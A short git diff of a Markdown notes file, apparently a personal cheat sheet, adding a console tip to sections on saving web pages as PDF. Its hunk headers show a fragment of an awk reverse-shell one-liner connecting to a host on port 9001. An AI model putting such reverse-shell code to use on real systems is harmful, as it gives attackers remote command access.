@@ -96,6 +96,7 @@ awk 'BEGIN {s = "/inet/tcp/0/10.10.10.10/9001"; while(42) { do{ printf "shell>" 
 --- 
 
 ### xxx2pdf
+> 打开浏览器控制台后粘贴js代码
 ### freebuf2pdf
 > ***2024-6-28: fb0sh***
 ```js
@@ -110,6 +111,7 @@ awk 'BEGIN {s = "/inet/tcp/0/10.10.10.10/9001"; while(42) { do{ printf "shell>" 
 ---
 ### wechat2pdf
 > ***2024-6-28: fb0sh***
+
 > **也可直接使用edge快捷键Ctrl+P**
 ```js
 window.print();
